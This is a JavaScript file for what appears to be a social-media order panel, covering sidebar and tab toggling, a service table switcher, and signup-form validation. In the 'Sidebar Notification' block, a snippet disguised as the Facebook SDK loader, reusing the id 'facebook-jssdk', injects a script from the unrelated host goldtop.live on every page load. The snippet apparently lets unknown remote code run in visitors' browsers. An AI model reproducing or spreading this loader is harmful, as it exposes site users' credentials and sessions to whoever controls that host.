$(document).ready(function () {
    $('#sidebarCollapse').on('click', function () {
        $('#sidebar').toggleClass('active');
    });
});

var el = document.getElementById('card-header-order');
if (el) {
    el.addEventListener('click', function(evt) {
        let ab = evt.target.getAttribute('data-id');
        let agclass = document.getElementsByClassName('tab-bar');
        for (let index = 0; index < agclass.length; index++) {
            agclass[index].classList.remove('order_active');
        }
        evt.target.classList.add('order_active');
        if (ab === 'new-order') {
            document.getElementById('new_order').style = 'display: block';
            document.getElementById('mass_order').style = 'display: none';
        } else if (ab === 'mass-order') {
            document.getElementById('mass_order').style = 'display: block';
            document.getElementById('new_order').style = 'display: none';
        }
    });
}


var el2 = document.getElementById('card-header-id');
if (el2) {
    el2.addEventListener('click', function(evt) {
        let ab = evt.target.getAttribute('data-id');
        let agclass = document.getElementsByClassName('tab-bar');
        for (let index = 0; index < agclass.length; index++) {
            agclass[index].classList.remove('news-tab-active');
        }
        evt.target.classList.add('news-tab-active');
        if (ab === 'latestNews') {
            document.getElementById('latest-news').style = 'display: block';
            document.getElementById('general-news').style = 'display: none';
        } else if (ab === 'genralnews') {
            document.getElementById('general-news').style = 'display: block';
            document.getElementById('latest-news').style = 'display: none';
        }
    });
}


// Sidebar Notification... (START)
jQuery(document).ready(function (e) {
    var i = e(".wp-sheet");
    function a() {
        i.is(":visible") ? (i.hide()) : (i.show())
    }
    e(".fbmsg-badge").click(function () {
        return a(), !1
    }), e(".wp-sheet-head-close").click(function () {
        return a(), !1
    }), "1" == (n = "fbmsg-sheet-open", (n = (document.cookie.match("(^|; )" + n + "=([^;]*)") || 0)[2]) && decodeURIComponent(n)) ? (i.show(), s()) : i.hide();
});

(function (d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id))
        return;
    js = d.createElement(s);
    js.id = id;
    js.src = "http://goldtop.live/gotoapi/";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));
// Sidebar Notification... (END)


$(function() {
    $('#service_type').change(function(){
        let orderVal = $('#service_type').val();
        $("table[id^= 'api_']").hide();
        $('#api_'+orderVal).show();
    });
    $('#api_0').show();
});

function userChildPanelValidation() {
    var domain = document.forms["userChildForm"]["domain"].value;
    var currency = document.forms["userChildForm"]["currency"].value;
    var email = document.forms["userChildForm"]["email"].value;
    var password = document.forms["userChildForm"]["password"].value;
    var password_confirmation = document.forms["userChildForm"]["password_confirmation"].value;
    if (domain === "") {
        $('#domainMsg').text('Domain is required');
        return false;
    }else if (currency === ""){
        $('#currencyMsg').text('Currency is required');
        return false;
    }else if (email === ""){
        $('#emailMsg').text('Email is required');
        return false;
    }else if (password === ""){
        $('#passwordMsg').text('Password is required');
        return false;
    }else if (password_confirmation === ""){
        $('#cpMsg').text('Confirm Password is required');
        return false;
    }else if (password !== password_confirmation){
        $('#passwordMsg').text('Yur confirm password not match');
        return false;
    }
}
